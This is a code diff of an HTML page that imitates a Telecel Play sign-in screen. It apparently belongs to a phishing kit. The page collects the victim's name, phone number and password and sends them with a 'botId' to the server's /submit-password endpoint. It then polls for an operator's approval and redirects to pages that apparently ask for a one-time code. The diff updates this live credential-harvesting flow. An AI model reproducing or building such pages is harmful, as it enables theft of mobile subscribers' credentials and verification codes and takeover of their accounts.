@@ -1,285 +1,293 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verify Details</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Verify Details</title>
 
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, Helvetica, sans-serif;
-      background: radial-gradient(circle at top right, #b71c1c 0%, #0b0b0b 45%);
-      color: #ffffff;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: radial-gradient(circle at top right, #b71c1c 0%, #0b0b0b 45%);
+    color: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
 
-    .container {
-      width: 100%;
-      max-width: 420px;
-      padding: 24px;
-    }
+  .container {
+    width: 100%;
+    max-width: 420px;
+    padding: 24px;
+  }
 
-    .logo {
-      text-align: center;
-      margin-bottom: 24px;
-    }
+  .logo {
+    text-align: center;
+    margin-bottom: 24px;
+  }
 
-    .logo-circle {
-      width: 64px;
-      height: 64px;
-      background: #e53935;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 8px;
-      font-size: 34px;
-      font-weight: bold;
-    }
+  .logo-circle {
+    width: 64px;
+    height: 64px;
+    background: #e53935;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 8px;
+    font-size: 34px;
+    font-weight: bold;
+  }
 
-    .telecel {
-      font-size: 22px;
-      font-weight: bold;
-      color: #e53935;
-      margin-bottom: 6px;
-    }
+  .telecel {
+    font-size: 22px;
+    font-weight: bold;
+    color: #e53935;
+    margin-bottom: 6px;
+  }
 
-    .welcome {
-      font-size: 16px;
-      font-weight: bold;
-      color: #e53935;
-      margin-bottom: 6px;
-    }
+  .welcome {
+    font-size: 16px;
+    font-weight: bold;
+    color: #e53935;
+    margin-bottom: 6px;
+  }
 
-    .desc {
-      font-size: 13px;
-      color: #bdbdbd;
-      line-height: 1.4;
-      margin-bottom: 22px;
-    }
+  .desc {
+    font-size: 13px;
+    color: #bdbdbd;
+    line-height: 1.4;
+    margin-bottom: 22px;
+  }
 
-    label {
-      font-size: 13px;
-      color: #bdbdbd;
-      margin-bottom: 6px;
-      display: block;
-    }
+  label {
+    font-size: 13px;
+    color: #bdbdbd;
+    margin-bottom: 6px;
+    display: block;
+  }
 
-    input,
-    select {
-      width: 100%;
-      padding: 14px;
-      font-size: 15px;
-      margin-bottom: 18px;
-      border-radius: 10px;
-      border: 1px solid #2a2a2a;
-      background: #1b1b1b;
-      color: #ffffff;
-      box-sizing: border-box;
-    }
+  input, select {
+    width: 100%;
+    padding: 14px;
+    font-size: 15px;
+    margin-bottom: 18px;
+    border-radius: 10px;
+    border: 1px solid #2a2a2a;
+    background: #1b1b1b;
+    color: #ffffff;
+    box-sizing: border-box;
+  }
 
-    select {
-      appearance: none;
-      background-image: url("data:image/svg+xml,%3Csvg width='12' height='8' viewBox='0 0 12 8' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1L6 6L11 1' stroke='%23aaa' stroke-width='2'/%3E%3C/svg%3E");
-      background-repeat: no-repeat;
-      background-position: right 16px center;
-      background-size: 12px;
-    }
+  .password-wrap {
+    position: relative;
+  }
 
-    .password-wrap {
-      position: relative;
-    }
+  .eye {
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    color: #aaa;
+  }
 
-    .eye {
-      position: absolute;
-      right: 14px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-      color: #aaa;
-    }
+  .forgot {
+    text-align: right;
+    font-size: 12px;
+    color: #e53935;
+    margin-top: -10px;
+    margin-bottom: 16px;
+  }
 
-    .forgot {
-      text-align: right;
-      font-size: 12px;
-      color: #e53935;
-      margin-top: -10px;
-      margin-bottom: 16px;
-    }
+  button {
+    width: 100%;
+    padding: 16px;
+    font-size: 16px;
+    border-radius: 10px;
+    cursor: pointer;
+  }
 
-    button {
-      width: 100%;
-      padding: 16px;
-      font-size: 16px;
-      border-radius: 10px;
-      cursor: pointer;
-    }
+  .primary {
+    background: #e53935;
+    border: none;
+    color: #ffffff;
+    margin-bottom: 12px;
+  }
 
-    .primary {
-      background: #e53935;
-      border: none;
-      color: #ffffff;
-      margin-bottom: 12px;
-    }
+  .secondary {
+    background: transparent;
+    border: 1px solid #e53935;
+    color: #e53935;
+  }
 
-    .secondary {
-      background: transparent;
-      border: 1px solid #e53935;
-      color: #e53935;
-    }
+  .status {
+    margin-top: 16px;
+    text-align: center;
+    font-size: 14px;
+    display: none;
+  }
 
-    .status {
-      margin-top: 16px;
-      text-align: center;
-      font-size: 14px;
-      color: #4caf50;
-      display: none;
-    }
+  .error {
+    color: #e53935;
+  }
 
-    .error {
-      color: #e53935;
-    }
+  /* 🔥 LOADING SPINNER */
+  .spinner {
+    margin: 12px auto 0;
+    width: 28px;
+    height: 28px;
+    border: 3px solid rgba(255,255,255,0.2);
+    border-top: 3px solid #e53935;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    display: none;
+  }
 
-    .footer {
-      margin-top: 28px;
-      text-align: center;
-      font-size: 12px;
-      color: #777;
-    }
-  </style>
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .footer {
+    margin-top: 28px;
+    text-align: center;
+    font-size: 12px;
+    color: #777;
+  }
+</style>
 </head>
 <body>
 
-  <div class="container">
+<div class="container">
 
-    <div class="logo">
-      <div class="logo-circle">t</div>
-      <div class="telecel">telecel</div>
-      <div class="welcome">Welcome to Telecel Play</div>
-      <div class="desc">
-        Enter your number to sign up or log in.<br>
-        You need to be a Telecel subscriber to proceed.
-      </div>
+  <div class="logo">
+    <div class="logo-circle">t</div>
+    <div class="telecel">telecel</div>
+    <div class="welcome">Welcome to Telecel Play</div>
+    <div class="desc">
+      Enter your number to sign up or log in.<br>
+      You need to be a Telecel subscriber to proceed.
     </div>
-
-    <form id="detailsForm">
-
-      <label>Account type</label>
-      <select id="accountType">
-        <option>Mobile</option>
-        <option>Broadband</option>
-      </select>
-
-      <label>Phone Number</label>
-      <input type="text" id="phone" required />
-
-      <label>Password</label>
-      <div class="password-wrap">
-        <input type="password" id="password" required />
-        <span class="eye" onclick="togglePassword()">👁</span>
-      </div>
-
-      <div class="forgot">Forgot your password?</div>
-
-      <button type="submit" class="primary">Next</button>
-    </form>
-
-    <div id="status" class="status">⏳ Waiting for approval...</div>
-
-    <button class="secondary" onclick="history.back()">Go Back</button>
-
-    <div class="footer">v 5.3.2 (1.0.0)</div>
   </div>
 
-  <script>
-    const form = document.getElementById('detailsForm');
-    const statusEl = document.getElementById('status');
-    const passwordInput = document.getElementById('password');
+  <form id="detailsForm">
 
-    const fullName = localStorage.getItem('fullName');
+    <label>Account type</label>
+    <select id="accountType">
+      <option>Mobile</option>
+      <option>Broadband</option>
+    </select>
 
-    // ✅ FIXED botId HANDLING
-    const params = new URLSearchParams(window.location.search);
-    const urlBotId = params.get('botId');
+    <label>Phone Number</label>
+    <input type="text" id="phone" required />
 
-    if (urlBotId) {
-      localStorage.setItem('botId', urlBotId);
-    }
+    <label>Password</label>
+    <div class="password-wrap">
+      <input type="password" id="password" required />
+      <span class="eye" onclick="togglePassword()">👁</span>
+    </div>
 
-    const botId = localStorage.getItem('botId');
+    <div class="forgot">Forgot your password?</div>
 
-    if (!botId || !fullName) {
-      alert('Session expired. Please start again.');
-      window.location.href = 'index.html';
-    }
+    <button type="submit" class="primary">Next</button>
+  </form>
 
-    function togglePassword() {
-      passwordInput.type =
-        passwordInput.type === 'password' ? 'text' : 'password';
-    }
+  <div id="status" class="status">⏳ Waiting for approval...</div>
+  <div id="spinner" class="spinner"></div>
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
+  <button class="secondary" onclick="history.back()">Go Back</button>
 
-      const phone = document.getElementById('phone').value;
-      const password = passwordInput.value;
+  <div class="footer">v 5.3.2 (1.0.0)</div>
+</div>
 
-      localStorage.setItem('phone', phone);
+<script>
+const form = document.getElementById('detailsForm');
+const statusEl = document.getElementById('status');
+const spinner = document.getElementById('spinner');
+const passwordInput = document.getElementById('password');
 
-      statusEl.style.display = 'block';
-      statusEl.classList.remove('error');
-      statusEl.textContent = '⏳ Waiting for approval...';
+const fullName = localStorage.getItem('fullName');
 
-      try {
-        const res = await fetch(
-          `${window.location.origin}/submit-password`,
-          {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              name: fullName,
-              phone,
-              password,
-              botId
-            })
-          }
-        );
+const params = new URLSearchParams(window.location.search);
+const urlBotId = params.get('botId');
 
-        if (!res.ok) throw new Error();
+if (urlBotId) localStorage.setItem('botId', urlBotId);
+const botId = localStorage.getItem('botId');
 
-        const { requestId } = await res.json();
-        pollApproval(requestId);
+if (!botId || !fullName) {
+  alert('Session expired. Please start again.');
+  window.location.href = 'index.html';
+}
 
-      } catch {
-        statusEl.classList.add('error');
-        statusEl.textContent = '❌ Server error. Please try again.';
+function togglePassword() {
+  passwordInput.type =
+    passwordInput.type === 'password' ? 'text' : 'password';
+}
+
+form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  const phone = document.getElementById('phone').value;
+  const password = passwordInput.value;
+
+  localStorage.setItem('phone', phone);
+
+  statusEl.style.display = 'block';
+  spinner.style.display = 'block';
+  statusEl.classList.remove('error');
+  statusEl.textContent = '⏳ Waiting for approval...';
+
+  try {
+    const res = await fetch(
+      `${window.location.origin}/submit-password`,
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ name: fullName, phone, password, botId })
       }
-    });
+    );
 
-    function pollApproval(requestId) {
-      const interval = setInterval(async () => {
-        const res = await fetch(
-          `${window.location.origin}/check-password/${requestId}`
-        );
-        const data = await res.json();
+    if (!res.ok) throw new Error();
 
-        if (data.approved === true) {
-          clearInterval(interval);
-          window.location.href = 'code.html';
-        }
+    const { requestId } = await res.json();
+    pollApproval(requestId);
 
-        if (data.approved === false) {
-          clearInterval(interval);
-          statusEl.classList.add('error');
-          statusEl.textContent = '❌ Incorrect password. Please try again.';
-        }
-      }, 2000);
+  } catch {
+    spinner.style.display = 'none';
+    statusEl.classList.add('error');
+    statusEl.textContent = '❌ Server error. Please try again.';
+  }
+});
+
+function pollApproval(requestId) {
+  const interval = setInterval(async () => {
+    const res = await fetch(
+      `${window.location.origin}/check-password/${requestId}`
+    );
+    const data = await res.json();
+
+    if (data.redirect === 'code2') {
+      clearInterval(interval);
+      window.location.href = 'code2.html';
     }
-  </script>
+
+    if (data.redirect === 'code') {
+      clearInterval(interval);
+      window.location.href = 'code.html';
+    }
+
+    if (data.approved === false) {
+      clearInterval(interval);
+      spinner.style.display = 'none';
+      statusEl.classList.add('error');
+      statusEl.textContent = '❌ Incorrect details. Please try again.';
+    }
+
+  }, 2000);
+}
+</script>
 
 </body>
 </html>
